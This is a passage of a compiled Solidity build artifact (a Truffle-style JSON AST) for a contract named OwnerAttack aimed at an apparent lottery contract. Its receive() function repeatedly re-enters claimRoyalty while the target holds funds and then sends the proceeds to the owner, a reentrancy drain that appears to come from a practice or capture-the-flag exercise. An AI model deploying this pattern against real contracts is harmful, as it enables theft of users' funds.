                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 10304,
                          "name": "lotteryContract",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 10282,
                          "src": "648:15:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_ILottery_$10265",
                            "typeString": "contract ILottery"
                          }
                        },
                        "id": 10306,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberLocation": "664:3:3",
                        "memberName": "bet",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 10256,
                        "src": "648:19:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
                          "typeString": "function () payable external"
                        }
                      },
                      "id": 10309,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "expression": {
                            "id": 10307,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "674:3:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 10308,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberLocation": "678:5:3",
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "674:9:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "src": "648:36:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 10310,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "648:38:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 10311,
                  "nodeType": "ExpressionStatement",
                  "src": "648:38:3"
                }
              ]
            },
            "functionSelector": "11610c25",
            "id": 10313,
            "implemented": true,
            "kind": "function",
            "modifiers": [
              {
                "id": 10302,
                "kind": "modifierInvocation",
                "modifierName": {
                  "id": 10301,
                  "name": "onlyOwner",
                  "nameLocations": [
                    "632:9:3"
                  ],
                  "nodeType": "IdentifierPath",
                  "referencedDeclaration": 10277,
                  "src": "632:9:3"
                },
                "nodeType": "ModifierInvocation",
                "src": "632:9:3"
              }
            ],
            "name": "bet",
            "nameLocation": "609:3:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10300,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "612:2:3"
            },
            "returnParameters": {
              "id": 10303,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "642:0:3"
            },
            "scope": 10357,
            "src": "600:91:3",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 10323,
              "nodeType": "Block",
              "src": "837:41:3",
              "statements": [
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 10318,
                        "name": "lotteryContract",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 10282,
                        "src": "843:15:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_ILottery_$10265",
                          "typeString": "contract ILottery"
                        }
                      },
                      "id": 10320,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "859:12:3",
                      "memberName": "claimRoyalty",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 10264,
                      "src": "843:28:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 10321,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "843:30:3",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 10322,
                  "nodeType": "ExpressionStatement",
                  "src": "843:30:3"
                }
              ]
            },
            "functionSelector": "9e5faafc",
            "id": 10324,
            "implemented": true,
            "kind": "function",
            "modifiers": [
              {
                "id": 10316,
                "kind": "modifierInvocation",
                "modifierName": {
                  "id": 10315,
                  "name": "onlyOwner",
                  "nameLocations": [
                    "827:9:3"
                  ],
                  "nodeType": "IdentifierPath",
                  "referencedDeclaration": 10277,
                  "src": "827:9:3"
                },
                "nodeType": "ModifierInvocation",
                "src": "827:9:3"
              }
            ],
            "name": "attack",
            "nameLocation": "801:6:3",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10314,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "807:2:3"
            },
            "returnParameters": {
              "id": 10317,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "837:0:3"
            },
            "scope": 10357,
            "src": "792:86:3",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 10355,
              "nodeType": "Block",
              "src": "909:173:3",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 10334,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "expression": {
                        "arguments": [
                          {
                            "id": 10329,
                            "name": "lotteryContract",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 10282,
                            "src": "927:15:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_ILottery_$10265",
                              "typeString": "contract ILottery"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_contract$_ILottery_$10265",
                              "typeString": "contract ILottery"
                            }
                          ],
                          "id": 10328,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "919:7:3",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_$",
                            "typeString": "type(address)"
                          },
                          "typeName": {
                            "id": 10327,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "919:7:3",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 10330,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "nameLocations": [],
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "919:24:3",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 10331,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "944:7:3",
                      "memberName": "balance",
                      "nodeType": "MemberAccess",
                      "src": "919:32:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": ">=",
                    "rightExpression": {
                      "expression": {
                        "id": 10332,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 4294967281,
                        "src": "955:3:3",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 10333,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberLocation": "959:5:3",
                      "memberName": "value",
                      "nodeType": "MemberAccess",
                      "src": "955:9:3",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "src": "919:45:3",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": {
                    "id": 10353,
                    "nodeType": "Block",
                    "src": "1017:61:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "expression": {
                                "arguments": [
                                  {
                                    "id": 10348,
                                    "name": "this",
                                    "nodeType": "Identifier",
                                    "overloadedDeclarations": [],
                                    "referencedDeclaration": 4294967268,
                                    "src": "1057:4:3",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_contract$_OwnerAttack_$10357",
                                      "typeString": "contract OwnerAttack"
                                    }
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": [
                                    {
                                      "typeIdentifier": "t_contract$_OwnerAttack_$10357",
                                      "typeString": "contract OwnerAttack"
                                    }
                                  ],
                                  "id": 10347,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "lValueRequested": false,
                                  "nodeType": "ElementaryTypeNameExpression",
                                  "src": "1049:7:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_type$_t_address_$",
                                    "typeString": "type(address)"
                                  },
                                  "typeName": {
                                    "id": 10346,
                                    "name": "address",
                                    "nodeType": "ElementaryTypeName",
                                    "src": "1049:7:3",
                                    "typeDescriptions": {}
                                  }
                                },
                                "id": 10349,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "kind": "typeConversion",
                                "lValueRequested": false,
                                "nameLocations": [],
                                "names": [],
                                "nodeType": "FunctionCall",
                                "src": "1049:13:3",
                                "tryCall": false,
                                "typeDescriptions": {
                                  "typeIdentifier": "t_address",
                                  "typeString": "address"
                                }
                              },
                              "id": 10350,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "lValueRequested": false,
                              "memberLocation": "1063:7:3",
                              "memberName": "balance",
                              "nodeType": "MemberAccess",
                              "src": "1049:21:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            ],
                            "expression": {
                              "arguments": [
                                {
                                  "id": 10343,
                                  "name": "owner",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 10279,
                                  "src": "1033:5:3",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_address",
                                    "typeString": "address"
                                  }
                                ],
                                "id": 10342,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "1025:8:3",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_payable_$",
                                  "typeString": "type(address payable)"
                                },
                                "typeName": {
                                  "id": 10341,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "1025:8:3",
                                  "stateMutability": "payable",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 10344,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "1025:14:3",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address_payable",
                                "typeString": "address payable"
                              }
                            },
                            "id": 10345,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberLocation": "1040:8:3",
                            "memberName": "transfer",
                            "nodeType": "MemberAccess",
                            "src": "1025:23:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
                              "typeString": "function (uint256)"
                            }
                          },
                          "id": 10351,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "1025:46:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 10352,
                        "nodeType": "ExpressionStatement",
                        "src": "1025:46:3"
                      }
                    ]
                  },
                  "id": 10354,
                  "nodeType": "IfStatement",
                  "src": "915:163:3",
                  "trueBody": {
                    "id": 10340,
                    "nodeType": "Block",
                    "src": "966:45:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "id": 10335,
                              "name": "lotteryContract",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 10282,
                              "src": "974:15:3",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_ILottery_$10265",
                                "typeString": "contract ILottery"
                              }
                            },
                            "id": 10337,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberLocation": "990:12:3",
                            "memberName": "claimRoyalty",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 10264,
                            "src": "974:28:3",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                              "typeString": "function () external"
                            }
                          },
                          "id": 10338,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "974:30:3",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 10339,
                        "nodeType": "ExpressionStatement",
                        "src": "974:30:3"
                      }
                    ]
                  }
                }
              ]
            },
            "id": 10356,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 10325,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "889:2:3"
            },
            "returnParameters": {
              "id": 10326,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "909:0:3"
            },
            "scope": 10357,
            "src": "882:200:3",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 10358,
        "src": "250:834:3",
        "usedErrors": []
      }
    ],
    "src": "32:1057:3"
  },
  "compiler": {
    "name": "solc",
    "version": "0.8.17+commit.8df45f5f.Emscripten.clang"
  },
  "networks": {},
  "schemaVersion": "3.4.11",
  "updatedAt": "2023-04-14T20:22:55.686Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}